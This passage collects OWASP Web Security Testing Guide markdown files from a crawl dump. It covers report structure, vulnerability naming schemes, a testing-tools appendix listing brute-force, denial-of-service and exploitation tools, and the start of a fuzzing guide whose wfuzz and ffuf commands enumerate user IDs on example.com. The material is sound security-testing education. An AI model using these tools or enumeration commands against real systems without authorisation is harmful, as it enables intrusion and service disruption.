"2025-10-24T11:39:59.792150"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/12-API_Testing/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/README.md", "content": "# 4.12 API Testing\n\n4.12.0 [API Testing Overview](00-API_Testing_Overview.md)\n\n4.12.1 [API Reconnaissance](01-API_Reconnaissance.md)\n\n4.12.2 [API Broken Object Level Authorization](02-API_Broken_Object_Level_Authorization.md)\n\n4.12.99 [Testing GraphQL](99-Testing_GraphQL.md)\n", "timestamp": "2025-10-24T11:39:59.880084"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/README.md", "content": "# Web Application Security Testing\n\n4.0 [Introduction and Objectives](00-Introduction_and_Objectives/README.md)\n\n4.1 [Information Gathering](01-Information_Gathering/README.md)\n\n4.2 [Configuration and Deployment Management Testing](02-Configuration_and_Deployment_Management_Testing/README.md)\n\n4.3 [Identity Management Testing](03-Identity_Management_Testing/README.md)\n\n4.4 [Authentication Testing](04-Authentication_Testing/README.md)\n\n4.5 [Authorization Testing](05-Authorization_Testing/README.md)\n\n4.6 [Session Management Testing](06-Session_Management_Testing/README.md)\n\n4.7 [Input Validation Testing](07-Input_Validation_Testing/README.md)\n\n4.8 [Testing for Error Handling](08-Testing_for_Error_Handling/README.md)\n\n4.9 [Testing for Weak Cryptography](09-Testing_for_Weak_Cryptography/README.md)\n\n4.10 [Business Logic Testing](10-Business_Logic_Testing/README.md)\n\n4.11 [Client-side Testing](11-Client-side_Testing/README.md)\n\n4.12 [API Testing](12-API_Testing/README.md)\n", "timestamp": "2025-10-24T11:40:00.168723"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/5-Reporting/01-Reporting_Structure.md", "url": "https://github.com/OWASP/wstg/blob/master/document/5-Reporting/01-Reporting_Structure.md", "content": "# Reporting\n\nPerforming the technical side of the assessment is only half of the overall assessment process. The final product is the production of a well written and informative report. A report should be easy to understand and should highlight all the risks found during the assessment phase. The report should appeal to both executive management and technical staff.\n\n## About This Section\n\nThis guide provides only suggestions about one possible approach to reporting, and should not be treated as as strict rules that must be followed. When considering any of the recommendations below, always ask yourself whether the recommendation would improve your report.\n\nThis guide to reporting is a best fit for consultancy-based reports. It may be overkill for internal or bug bounty reports.\n\nRegardless of the audience, it's advisable to secure the report and encrypt it to ensure that only the receiving party is able to use it.\n\nA good report helps your client understand your findings and highlights the quality of your technical testing. The quality of the technical testing is completely irrelevant if the client can't understand your findings.\n\n## 1. Introduction\n\n### 1.1 Version Control\n\nSets report changes, mostly presented in a table format such as the below.\n\n| Version | Description | Date | Author |\n|:-------:|-------------|------|--------|\n| 1.0 | Initial report | DD/MM/YYYY | J. Doe |\n\n### 1.2 Table of Contents\n\nA table of contents page for the document.\n\n### 1.3 The Team\n\nA list of the team members detailing their expertise and qualifications.\n\n### 1.4 Scope\n\nThe boundaries and the needs of the engagement agreed upon with the organization.\n\n### 1.5 Limitations\n\nLimitations can be:\n\n- Out-of-bounds areas in relation to testing.\n- Broken functionality.\n- Lack of cooperation.\n- Lack of time.\n- Lack of access or credentials.\n\n### 1.6 Timeline\n\nThe duration of the engagement.\n\n### 1.7 Disclaimer\n\nYou may wish to provide a disclaimer for your service. Always consult a legal professional in order to create a legally-binding document.\n\nThe following example is for illustrative purposes only. It should not be used as-is and does not constitute legal advice.\n\n*This test is a \"point in time\" assessment and as such the environment could have changed since the test was run. There is no guarantee that all possible security issues have been identified, and that new vulnerabilities may have been discovered since the tests were run. As such, this report serves as a guiding document and not a warranty that the report provides a full representation of the risks threatening the systems at hand.*\n\n## 2. Executive Summary\n\nThis is like the elevator pitch of the report, it aims at providing executives with:\n\n- The objective of the test.\n    - Describe the business need behind the security test.\n    - Describe how the tests helped the organization understand their systems.\n- Key findings in a business context, such as possible compliance issues, reputation damage, etc. Focus on the business impact and leave out technical details for now.\n- The strategic recommendations on how the business can stop the issues from happening again. Describe these in a non-technical context and leave specific technical recommendations out for now.\n\nThe summary should be constructive and meaningful. Avoid jargon and negative speculation. If figures, graphs, or illustrations are used, ensure they help deliver a message in a clearer way than text would.\n\n## 3. Findings\n\nThis section is aimed at the technical team. It should include all the necessary information to understand the vulnerability, replicate it, and resolve it. Logical separation can help improve the readability of the report. For example, you might have separate sections titled \"External Access\" and \"Internal Access\".\n\nIf this is a re-test, you might create a subsection that summarizes findings of the previous test, the updated status of previously identified vulnerabilities, and any cross-references with the current test.\n\n### 3.1 Findings Summary\n\nA list of the findings with their risk level. A table can be used for ease of use by both teams.\n\n| Ref. ID |  Title | Risk Level |\n|:------------:|--------|------------|\n| 1 | User Authentication Bypass | High |\n\n### 3.2 Findings Details\n\nEach finding should be detailed with the following information:\n\n- Reference ID, which can be used for communication between parties and for cross-references across the report.\n- The vulnerability title, such as \"User Authentication Bypass\".\n- The likelihood or exploitability of the issue, based on various factors such as:\n    - How easy it is to exploit.\n    - Whether there is working exploit code for it.\n    - The level of access required.\n    - Attacker motivation to exploit it.\n- The impact of the vulnerability on the system.\n- Risk of the vulnerability on the application.\n    - Some suggested values are: Informational, Low, Medium, High, and Critical. Ensure that you detail the values you decide to use in an appendix. This allows the reader to understand how each score is determined.\n    - On certain engagements it is required to have a [CVSS](https://www.first.org/cvss/) score. If not required, sometimes it is good to have, and other times it just adds complexity to the report.\n- Detailed description of what the vulnerability is, how to exploit it, and the damage that may result from its exploitation. Any possibly-sensitive data should be masked, for example, passwords, personal information, or credit card details.\n- Detailed steps on how to remediate the vulnerability, possible improvements that could help strengthen the security posture, and missing security practices.\n- Additional resources that could help the reader to understand the vulnerability, such as an image, a video, a CVE, an external guide, etc.\n\nFormat this section in a way that best delivers your message.\n\nAlways ensure that your descriptions provide enough information for the engineer reading this report to take action based on it. Explain the finding thoroughly and provide as much technical detail as might be necessary to remedy it.\n\n## Appendices\n\nMultiple appendices can be added, such as:\n\n- Test methodology used.\n- Severity and risk rating explanations.\n- Relevant output from tools used.\n    - Make sure to clean the output and not just dump it.\n- A checklist of all the tests conducted, such as the [WSTG checklists](https://github.com/OWASP/wstg/tree/master/checklists). These can be provided as attachments to the report.\n\n## References\n\nThis section is not part of the suggested report format. The below links provide more guidance to writing your reports.\n\n- [SANS: Tips for Creating a Strong Cybersecurity Assessment Report](https://www.sans.org/blog/tips-for-creating-a-strong-cybersecurity-assessment-report/)\n- [SANS: Writing a Penetration Testing Report](https://www.sans.org/reading-room/whitepapers/bestprac/paper/33343)\n- [Infosec Institute: The Art of Writing Penetration Test Reports](https://resources.infosecinstitute.com/topic/writing-penetration-testing-reports/)\n- [Dummies: How to Structure a Pen Test Report](https://www.dummies.com/computers/macs/security/how-to-structure-a-pen-test-report/)\n- [Rhino Security Labs: Four Things Every Penetration Test Report Should Have](https://rhinosecuritylabs.com/penetration-testing/four-things-every-penetration-test-report/)\n", "timestamp": "2025-10-24T11:40:00.495822"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/5-Reporting/02-Naming_Schemes.md", "url": "https://github.com/OWASP/wstg/blob/master/document/5-Reporting/02-Naming_Schemes.md", "content": "# Vulnerability Naming Schemes\n\nWith a constantly growing number of IT assets to administer, security practitioners require new and more powerful tools to perform automated and large scale analysis. Thanks to software attention can be focused on the more creative and intellectually challenging problems. Unfortunately, having vulnerability assessment tools, antivirus software, and intrusion detection systems communicate its not an easy job. It has resulted in several technical complications, requiring a standardized way to identify each software flaw, vulnerability, or configuration issues identified. The lack of this interoperability capabilities can cause inconsistencies during the security assessment, confusing reporting, and extra correlation efforts among other problems that will produce an important waste of resources and time.\n\nA naming scheme is a systematic methodology used to identify each one of those vulnerabilities in order to facilitate clear identification and information sharing. This goal is achieved by the definition of a unique, structured, and software-efficient name for each vulnerability. There are multiple schemes used to facilitate this effort, the most common are:\n\n- Common Platform Enumeration (`CPE`)\n- Software Identification Tag (`SWID`)\n- Package URL (`PURL`)\n\n## Software Identification Tag\n\nSoftware Identification Tag (`SWID`) is an International Organization for Standardization's standard defined by the ISO/IEC 19770-2:2015. The `SWID` tags are used to identify each software clearly as part of comprehensive software asset management lifecycles. This information schema is recommended to be used by the National Institute of Standards and Technology (NIST) as the primary identification for any developed or installed software. From `SWID` it's possible to generate other schemas such as the `CPE` used by the National Vulnerability Database (NVD) whereas the reverse process is not possible.\n\nEach `SWID` tag is represented as a standardized XML format. A `SWID` tag is composed for three groups of elements. The first block composed by 7 predefined elements required to be considered a valid tag. Followed by an optional block which provides a set of 30 possible predefined elements that the tag creator can use to provide reliable and detailed information. Finally, the `Extended` group of elements provides the opportunity for the tag creator to define any non predefined elements required to accurately define the described software. The high level of granularity provided by `SWID`, not only provides the capability to describe a given product of software, but also it's specific status on the software lifecycle.\n\n### Examples\n\n- _ACME Roadrunner Service Pack 1_ patch created by the ACME Corporation for the already installed product identified with the `@tagId`: _com.acme.rms-ce-v4-1-5-0_:\n\n```xml\n<SoftwareIdentity\n                  xmlns=\"https://standards.iso.org/iso/19770/-2/2015/schema.xsd\"\n                  name=\"ACME Roadrunner Service Pack 1\"\n                  tagId=\"com.acme.rms-ce-sp1-v1-0-0\"\n                  patch=\"true\"\n                  version=\"1.0.0\">\n  <Entity\n          name=\"The ACME Corporation\"\n          regid=\"acme.com\"\n          role=\"tagCreator softwareCreator\"/>\n  <Link\n        rel=\"patches\"\n        href=\"swid:com.acme.rms-ce-v4-1-5-0\">\n    ...\n</SoftwareIdentity>\n```\n\n- Red Hat Enterprise Linux version 8 for x86-64 architecture:\n\n```xml\n<SoftwareIdentity\n                  xmlns=\"https://standards.iso.org/iso/19770/-2/2015/schema.xsd\"\n                  xmlns:xsi=\"https://www.w3.org/2001/XMLSchema-instance\"\n                  xsi:schemaLocation=\"https://standards.iso.org/iso/19770/-2/2015/schema.xsd\"\n                  xml:lang=\"en-US\"\n                  name=\"Red Hat Enterprise Linux\"\n                  tagId=\"com.redhat.RHEL-8-x86_64\"\n                  tagVersion=\"1\"\n                  version=\"8\"\n                  versionScheme=\"multipartnumeric\"\n                  media=\"(OS:linux)\">\n```\n\n## Common Platform Enumeration\n\nThe Common Platform Enumeration scheme (`CPE`) is a structured naming scheme for information technology systems, software, and packages maintained by `NVD`. Commonly used in conjunction with the Common Vulnerabilities and Exposures identification codes (e.g. `CVE-2017-0147`). Despite being considered a deprecated scheme superseded by `SWID`, `CPE` is still widely used by several security solutions.\n\nDefined as a Dictionary of registered values provided by `NVD`. Each `CPE` code can be defined as a well-formatted name or as a URL. Each value MUST follow this structure:\n\n- _cpe-name_ = \"cpe:\" component-list\n- _component-list_ = part \":\" vendor \":\" product \":\" version \":\" update \":\" edition \":\" lang\n- _component-list_ = part \":\" vendor \":\" product \":\" version \":\" update \":\" edition\n- _component-list_ = part \":\" vendor \":\" product \":\" version \":\" update\n- _component-list_ = part \":\" vendor \":\" product \":\" version\n- _component-list_ = part \":\" vendor \":\" product\n- _component-list_ = part \":\" vendor\n- _component-list_ = part\n- _component-list_ = empty\n- _part_ = \"h\" / \"o\" / \"a\" = string\n- _vendor_ = string\n- _product_ = string\n- _version_ = string\n- _update_ = string\n- _edition_ = string\n- _lang_ LANGTAG / empty\n- _string_ = *( unreserved / pct-encoded )\n- _empty_ = \"\"\n- _unreserved_ = ALPHA / DIGIT / \"-\" / \".\" / \"_\" / \" ̃\"\n- _pct-encoded_ = \"%\" HEXDIG HEXDIG\n- _ALPHA_ = %x41-5a / %x61-7a ; A-Z or a-z\n- _DIGIT_ = %x30-39 ; 0-9\n- _HEXDIG_ = DIGIT / \"a\" / \"b\" / \"c\" / \"d\" / \"e\" / \"f\"\n- _LANGTAG_ = cf. [RFC5646]\n\n### Examples\n\n- Microsoft Internet Explorer 8.0.6001 Beta (any edition): `wfn:[part=\"a\",vendor=\"microsoft\",product=\"internet_explorer\", version=\"8\\.0\\.6001\",update=\"beta\",edition=ANY]` which binds to the following URL: `cpe:/a:microsoft:internet_explorer:8.0.6001:beta`.\n- Foo\\Bar Big$Money Manager 2010 Special Edition for iPod Touch 80GB: `wfn:[part=\"a\",vendor=\"foo\\\\bar\",product=\"big\\$money_manager_2010\", sw_edition=\"special\",target_sw=\"ipod_touch\",target_hw=\"80gb\"]`, which binds to the following URL:`cpe:/a:foo%5cbar:big%24money_manager_2010:::~~special~ipod_touch~80gb~`.\n\n## Package URL\n\nPackage URL standardizes how software package metadata is represented so that packages can be universally located regardless of what vendor, project, or ecosystem the packages belongs.\n\nA PURL is a valid `RFC3986` ASCII string defined URL composed of seven elements. Each of them is separated by a defined character in order to make it easily manipulated by software.\n\n`scheme:type/namespace/name@version?qualifiers#subpath`\n\nThe definition for each component is:\n\n- _scheme_: URL scheme compliant constant value of \"pkg\". (**Required**).\n- _type_: package type or package protocol such as maven, npm, nuget, gem, pypi, etc. (**Required**).\n- _namespace_: type-specific value to a package prefix such as it's owner name, groupid, etc. (Optional).\n- _name_: name of the package. (**Required**).\n- _version_: package version. (Optional).\n- _qualifiers_: extra qualifying data for a package such as an OS, architecture, a distro, etc. (Optional).\n- _subpath_: extra subpath within a package, relative to the package root. (Optional).\n\n### Examples\n\n- Curl software, packaged as a `.deb` package for Debian Jessie meant for an i386 architecture: `pkg:deb/debian/curl@7.50.3-1?arch=i386&distro=jessie`\n- Docker image of Apache Casandra signed with the SHA256 hash 244fd47e07d1004f0aed9c: `pkg:docker/cassandra@sha256:244fd47e07d1004f0aed9c`\n\n## Recommendation Uses\n\n| USE  | RECOMMENDATION  |\n|---|---|\n| Client or Server Application | CPE or SWID |\n| Container | PURL or SWID |\n| Firmware | CPE or SWID* |\n| Library or Framework (package) | PURL |\n| Library or Framework (non-package) | SWID |\n| Operating System | CPE or SWID |\n| Operating System Package | PURL or SWID |\n\n> Note: Due to the deprecated status of `CPE`, industry recommended seems to be that new projects implement `SWID` when they need to decide between the two methods. Even though `CPE` is known to be a widely used naming schema within current active projects and solutions.\n\n## References\n\n- [NISTIR 8060 - Guidelines for the Creation of Interoperable Software Identification (SWID) Tags (PDF)](https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8060.pdf)\n- [NISTIR 8085 - Forming Common Platform Enumeration (CPE) Names from Software Identification (SWID) Tags](https://csrc.nist.gov/CSRC/media/Publications/nistir/8085/draft/documents/nistir_8085_draft.pdf)\n- [ISO/IEC 19770-2:2015 - Information technology— Software asset management—Part2:Software identification tag](https://www.iso.org/standard/65666.html)\n- [Official Common Platform Enumeration (CPE) Dictionary](https://nvd.nist.gov/products/cpe)\n- [Common Platform Enumeration: Dictionary Specification Version 2.3](https://csrc.nist.gov/publications/detail/nistir/7697/final)\n- [PURL Specification](https://github.com/package-url/purl-spec)\n\n### Known Implementations\n\n- [packageurl-go](https://github.com/package-url/packageurl-go)\n- [packageurl-dotnet](https://github.com/package-url/packageurl-dotnet)\n- [packageurl-java](https://github.com/package-url/packageurl-java), [package-url-java](https://github.com/sonatype/package-url-java)\n- [packageurl-python](https://github.com/package-url/packageurl-python)\n- [packageurl-rust](https://github.com/package-url/packageurl.rs)\n- [packageurl-js](https://github.com/package-url/packageurl-js)\n", "timestamp": "2025-10-24T11:40:00.548258"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/6-Appendix/A-Testing_Tools_Resource.md", "url": "https://github.com/OWASP/wstg/blob/master/document/6-Appendix/A-Testing_Tools_Resource.md", "content": "# Testing Tools Resource\n\n## Introduction\n\nThis appendix is intended to provide a list of common tools that are used for web application testing. It does not aim to be a complete tool reference, and the inclusion of a tool here should not be seen as a specific endorsement of that tool by OWASP.\n\nThe list contains only tools that are freely available to download and use (although they may have licenses restricting their use for commercial activity).\n\n## General Web Testing\n\n### Web Proxies\n\n- [ZAP](https://www.zaproxy.org)\n    - The Zed Attack Proxy (ZAP) is an easy to use integrated penetration testing tool for finding vulnerabilities in web applications. It is designed to be used by people with a wide range of security experience and as such is ideal for developers and functional testers who are new to penetration testing.\n    - ZAP provides automated scanners as well as a set of tools that allow you to find security vulnerabilities manually.\n- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)\n    - Burp Suite is an intercepting proxy for security testing. It allows intercepting and modifying all HTTP(S) traffic passing in both directions, it can work with custom TLS certificates and non-proxy-aware clients.\n- [Telerik Fiddler](https://www.telerik.com/fiddler)\n    - Fiddler an intercepting web proxy that is primarily aimed at developers rather than penetration testers, but still provides useful functionality. It also hooks directly into the Windows HTTP APIs, allowing it to intercept traffic from some software that doesn't allow custom proxies to be set.\n\n### Firefox Extensions\n\n- [Firefox HTTP Header Live](https://addons.mozilla.org/en-US/firefox/addon/http-header-live)\n    - View HTTP headers of a page and while browsing.\n- [Firefox Multi-Account Containers](https://addons.mozilla.org/en-GB/firefox/addon/multi-account-containers/)\n    - Create multiple containers, each of which have their own isolated cookies and sessions. Useful for testing access control between different users.\n- [Firefox Tamper Data](https://addons.mozilla.org/en-US/firefox/addon/tamper-data-for-ff-quantum/)\n    - Use Tamper Data to view and modify HTTP/HTTPS headers and post parameters\n- [Firefox Web Developer](https://addons.mozilla.org/en-US/firefox/addon/web-developer/)\n    - The Web Developer extension adds various web developer tools to the browser.\n\n### Chrome Extensions\n\n- [Chrome Web Developer](https://chrome.google.com/webstore/detail/bfbameneiokkgbdmiekhjnmfkcnldhhm)\n    - The Web Developer extension adds a toolbar button to the browser with various web developer tools. This is the official port of the Web Developer extension for Chrome.\n- [HTTP Request Maker](https://chrome.google.com/webstore/detail/kajfghlhfkcocafkcjlajldicbikpgnp?hl=en-US)\n    - Request Maker is a tool for penetration testing. With it you can easily capture requests made by web pages, tamper with the URL, headers and POST data and, of course, make new requests\n- [Cookie Editor](https://chrome.google.com/webstore/detail/fngmhnnpilhplaeedifhccceomclgfbg?hl=en-US)\n    - Edit This Cookie is a cookie manager. You can add, delete, edit, search, protect and block cookies\n\n### Testing for Specific Vulnerabilities\n\n#### Testing for SQL Injection\n\n- [sqlmap](s://sqlmap.org)\n\n#### Testing TLS\n\n- [OWASP O-Saft](https://owasp.org/www-project-o-saft/)\n- [sslyze](https://github.com/nabla-c0d3/sslyze)\n- [testssl.sh](https://github.com/drwetter/testssl.sh)\n- [SSLScan](https://github.com/rbsec/sslscan)\n- [SSLLabs](https://www.ssllabs.com/ssltest/)\n\n#### Testing for Brute Force Attacks\n\n##### Hash Crackers\n\n- [John the Ripper](https://github.com/openwall/john)\n- [hashcat](https://hashcat.net/hashcat/)\n\n##### Remote Brute Force\n\n- [ZAP](https://www.zaproxy.org)\n- [Patator](https://github.com/lanjelot/patator)\n- [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)\n- [Burp Suite Community Edition (Intruder)](https://portswigger.net/burp/communitydownload)\n\n#### Fuzzers\n\n- [Ffuf](https://github.com/ffuf/ffuf)\n- [Wfuzz](https://github.com/xmendez/wfuzz)\n- [Jdam](https://gitlab.com/michenriksen/jdam)\n\n#### Google Hacking\n\n- [Google Hacking database](https://www.exploit-db.com/google-hacking-database/)\n\n#### Slow HTTP\n\n- [Slowloris](https://github.com/gkbrk/slowloris)\n- [slowhttptest](https://github.com/shekyan/slowhttptest)\n\n### Site Mirroring\n\n- [wget](https://www.gnu.org/software/wget/)\n- [wget for windows](https://gnuwin32.sourceforge.net/packages/wget.htm)\n- [curl](https://curl.haxx.se)\n\n### Content Discovery\n\n- [Gobuster](https://github.com/OJ/gobuster)\n- [Waybackurls](https://github.com/tomnomnom/waybackurls)\n    - Waybackurls fetches all URLs known to the Wayback Machine for a given domain, useful for reconnaissance.\n    - **Usage:**\n\n```bash\nwaybackurls example.com\n```\n\n- [GAU (Get All URLs)](https://github.com/lc/gau)\n    - GAU collects URLs from multiple public archives, including the Wayback Machine and Common Crawl.\n    - **Usage:**\n\n```bash\ngau example.com\n```\n\n- [Unfurl](https://github.com/tomnomnom/unfurl)\n    - Unfurl extracts subdomains, paths, and parameters from URLs for deeper analysis.\n    - **Usage:**\n\n```bash\nunfurl \"https://example.com/page?query=123\"\n```\n\n### Port and Service Discovery\n\n- [Nmap](https://nmap.org/)\n\n## Vulnerability Scanners\n\n- [ZAP](https://www.zaproxy.org)\n- [Nikto](https://cirt.net/Nikto2)\n- [Nuclei](https://nuclei.projectdiscovery.io/)\n- [SecOps Solution](https://secopsolution.com)\n\n## Exploitation Frameworks\n\n- [Metasploit](https://github.com/rapid7/metasploit-framework)\n- [BeEF](https://github.com/beefproject/beef/)\n\n## Linux Distributions\n\n- [Kali](https://www.kali.org)\n- [Parrot](https://www.parrotsec.org)\n- [Samurai](https://github.com/SamuraiWTF/samuraiwtf)\n- [Santoku](https://sourceforge.net/projects/santoku/)\n- [BlackArch](https://blackarch.org/downloads.html)\n\n## Source Code Analyzers\n\n- [Spotbugs](https://spotbugs.github.io)\n- [Find Security Bugs](https://find-sec-bugs.github.io)\n- [phpcs-security-audit](https://github.com/squizlabs/PHP_CodeSniffer)\n- [PMD](https://pmd.github.io)\n- [Microsoft's .NET Analyzers](https://docs.microsoft.com/en-us/visualstudio/code-quality/install-net-analyzers)\n- [SonarQube Community Edition](https://www.sonarqube.org)\n\n## Browser Automation Tools\n\nBrowser Automation tools are used to validate the functionality of web applications. Some follow a scripted approach and typically make use of a Unit Testing framework to construct test suites and test cases. Most, if not all, can be adapted to perform security specific tests in addition to functional tests.\n\n### Open Source Tools\n\n- [HtmlUnit](https://htmlunit.sourceforge.net)\n    - A Java and JUnit based framework that uses the Apache HttpClient as the transport.\n    - Very robust and configurable and is used as the engine for a number of other testing tools.\n- [Selenium](https://www.selenium.dev)\n    - JavaScript based testing framework, cross-platform and provides a GUI for creating tests.\n", "timestamp": "2025-10-24T11:40:00.976672"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/6-Appendix/B-Suggested_Reading.md", "url": "https://github.com/OWASP/wstg/blob/master/document/6-Appendix/B-Suggested_Reading.md", "content": "# Suggested Reading\n\n## Whitepapers\n\n- [The Economic Impacts of Inadequate Infrastructure for Software Testing](https://www.nist.gov/system/files/documents/director/planning/report02-3.pdf)\n- [Improving Web Application Security: Threats and Countermeasures](https://www.microsoft.com/en-ca/download/details.aspx?id=1330)\n- [NIST Publications](https://csrc.nist.gov/publications/sp)\n- [Fundamental Practices for Secure Software Development](https://safecode.org/wp-content/uploads/2018/03/SAFECode_Fundamental_Practices_for_Secure_Software_Development_March_2018.pdf)\n- [The OWASP Guide Project](https://wiki.owasp.org/index.php/OWASP_Guide_Project)\n- [Use Cases: Just the FAQs and Answers](https://www.ibm.com/developerworks/rational/library/content/RationalEdge/jan03/UseCaseFAQS_TheRationalEdge_Jan2003.pdf)\n\n## Books\n\n- The Art of Software Security Testing: Identifying Software Security Flaws, by Chris Wysopal, Lucas Nelson, Dino Dai Zovi, Elfriede Dustin, published by Addison-Wesley, ISBN 0321304861 (2006)\n- Building Secure Software: How to Avoid Security Problems the Right Way, by Gary McGraw and John Viega, published by Addison-Wesley Pub Co, ISBN 020172152X (2002)\n- [The Ethical Hack: A Framework for Business Value Penetration Testing, By James S. Tiller, Auerbach Publications, ISBN 084931609X (2005)](https://books.google.com/books?id=fwASXKXOolEC&printsec=frontcover&source=gbs_ge_summary_r&redir_esc=y#v=onepage&q&f=false)\n- [The Hacker's Handbook: The Strategy behind Breaking into and Defending Networks, By Susan Young, Dave Aitel, Auerbach Publications, ISBN: 0849308887 (2005)](https://books.google.com/books?id=AO2fsAPVC34C&printsec=frontcover&source=gbs_ge_summary_r&redir_esc=y#v=onepage&q&f=false)\n- [Hacking Exposed: Web Applications 3, by Joel Scambray, Vinvent Liu, Caleb Sima, published by McGraw-Hill Osborne Media, ISBN 007222438X (2010)](https://www.webhackingexposed.com/)\n- The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws, 2nd Edition - [published by Dafydd Stuttard, Marcus Pinto, ISBN 9781118026472 (2011)]\n- How to Break Software Security, by James Whittaker, Herbert H. Thompson, published by Addison Wesley, ISBN 0321194330 (2003)\n- How to Break Software: Functional and Security Testing of Web Applications and Web Services, by Make Andrews, James A. Whittaker, published by Pearson Education Inc., ISBN 0321369440 (2006)\n- Secure Coding: Principles and Practices, by Mark Graff and Kenneth R. Van Wyk, published by O’Reilly, ISBN 0596002424 (2003)\n- Secure Programming HOWTO, David Wheeler (2015)\n    - [Online version available here](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/index.html)\n- Software Security: Building Security In, by Gary McGraw, published by Addison-Wesley Professional, ISBN 0321356705 (2006)\n- Software Testing In The Real World (Acm Press Books) by Edward Kit, published by Addison-Wesley Professional, ISBN 0201877562 (1995)\n- Software Testing Techniques, 2nd Edition, By Boris Beizer, International Thomson Computer Press, ISBN 0442206720 (1990)\n- The Tangled Web: A Guide to Securing Modern Web Applications, by Michael Zalewski, published by No Starch Press Inc., ISBN 047131952X (2011)\n- The Unified Modeling Language – A User Guide – by Grady Booch, James Rumbaugh, Ivar Jacobson, published by Addison-Wesley Professional, ISBN 0321267974 (2005)\n- The Unified Modeling Language User Guide, by Grady Booch, James Rumbaugh, Ivar Jacobson, Ivar published by Addison-Wesley Professional, ISBN 0-201-57168-4 (1998)\n- Web Security Testing Cookbook: Systematic Techniques to Find Problems Fast, by Paco Hope, Ben Walther, published by O’Reilly, ISBN 0596514832 (2008)\n- Writing Secure Code, by Mike Howard and David LeBlanc, published by Microsoft Press, ISBN 0735617228 (2004)\n\n## Useful Sites\n\n- [Build Security In](https://www.us-cert.gov/bsi)\n- [CERT Secure Coding Standards](https://wiki.sei.cmu.edu/confluence/display/seccode/SEI+CERT+Coding+Standards)\n- [McAfee Foundstone Publications](https://www.mcafee.com/enterprise/en-us/search.html?q=Foundstone)\n- [McAfee Free Tools](https://www.mcafee.com/enterprise/en-us/downloads/free-tools.html)\n- [OASIS Web Application Security (WAS) TC](https://www.oasis-open.org/committees/tc_home.php?wg_abbrev=was)\n- [SANS Internet Storm Center (ISC)](https://isc.sans.edu/)\n- [The Open Worldwide Application Application Security Project (OWASP)](https://owasp.org)\n- [Pentestmonkey - Pen Testing Cheat Sheets](https://pentestmonkey.net/cheat-sheet)\n- [Secure Coding Guidelines for the .NET Framework 4.5](https://docs.microsoft.com/en-us/dotnet/standard/security/secure-coding-guidelines)\n- [Security in the Java platform](https://docs.oracle.com/javase/6/docs/technotes/guides/security/overview/jsoverview.html)\n- [System Administration, Networking, and Security Institute (SANS)](https://www.sans.org)\n- [Web Security – Articles](https://www.acunetix.com/blog/category/web-security-zone/)\n- [Testing Client-Side Security issues](http://www.domxss.com/domxss/)\n\n## Videos\n\n- [PentesterAcademy](https://www.pentesteracademy.com/)\n\n## Deliberately Insecure Web Applications\n\n- [OWASP Vulnerable Web Applications Directory Project](https://owasp.org/www-project-vulnerable-web-applications-directory/)\n- [OWASP Juice Shop](https://owasp-juice.shop)\n- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)\n- [Damn Vulnerable Web App](https://github.com/digininja/DVWA)\n- [Xtreme Vulnerable Web Application](https://github.com/s4n7h0/xvwa)\n- [Mutillidae](https://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10)\n", "timestamp": "2025-10-24T11:40:01.041667"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/6-Appendix/C-Fuzzing.md", "url": "https://github.com/OWASP/wstg/blob/master/document/6-Appendix/C-Fuzzing.md", "content": "# Fuzzing\n\n## Introduction\n\nFuzzing is the process or technique of sending a number of request to as target site in a certain interval of time. In other words, it is also similar to bruteforcing. Fuzzing is a process which can be achieved using tools like Wfuzz, ffuf, and so on. As a tester you would need to provide the tool with the target URL, parameter, endpoint, etc, and some sort of inputs. Then the fuzzing tool crafts requests and sends them to the target. After the fuzzing has finished, the responses, timing, status codes, and other characteristics need to be analyzed for potential vulnerabilities.\n\n## Why fuzzing?\n\nTesting for vulnerabilities by feeding input one by one manually can be chaotic. In the present era where people have less time and low patience levels, the idea of manually feeding input for finding bugs/vulnerabilities can be overwhelming. To reduce this perception and to save time; fuzzing can be a big plus point. Fuzzing is an automated process where much of the hard work is handled by a fuzzing tool. All an analyst has to do is analyze the various characteristics after the process is done. Consider a site where there are a many input fields to test for XSS. In a manual approach, all we do is feed the input field with XSS payloads one by one, which would be much too hectic. In contrast, for an automated approach, all you need is to provide the XSS payload list to the fuzzer and all the requests are handled by fuzzer.\n\n## Tools to Use for Fuzzing\n\nThere are hundreds of tools available in the industry for doing fuzzing. But some of the top rated, popular fuzzing tools are listed below.\n\n### Wfuzz\n\n[Wfuzz](https://github.com/xmendez/wfuzz) works by replacing the wordlist value to the place where there is placeholder `FUZZ`. To understand this more clearly let's consider an example:\n\n```bash\nwfuzz -w userIDs.txt https://example.com/view_photo?userId=FUZZ\n```\n\nIn the above command, `userIds.txt` is a wordlist file containing numeric ID values. Here, we are telling wfuzz to fuzz the request to the example URL. Note that `FUZZ` word in the URL, it will act as a placeholder for wfuzz to replace with values from the wordlist. All the numeric ID values from the `userIDs.txt` file will be inserted replacing the `FUZZ` keyword.\n\n### Ffuf\n\n[Ffuf](https://github.com/ffuf/ffuf) is a web fuzzing tool written in the Go language which is very fast and recursive in nature. It works similar to Wfuzz but in contrast it is recursive. Ffuf also works by replacing the placeholder `FUZZ` with wordlist values. For example:\n\n```bash\nffuf -w userIDs.txt -u https://example.com/view_photo?userId=FUZZ\n```\n\nHere the `-w` is the flag for wordlist and `-u` is the flag for the target URL. The rest of the working mechanism is the same as the Wfuzz. It replaces the `FUZZ` placeholder with `userIDs.txt` values.\n\n### GoBuster\n\n[GoBuster](https://github.com/OJ/gobuster) is another fuzzer written in the Go language which is most used for fuzzing URIs, directories/paths, DNS subdomains, AWS S3 buckets, vhost names, and supports concurrency. For example:\n\n```bash\ngobuster dir 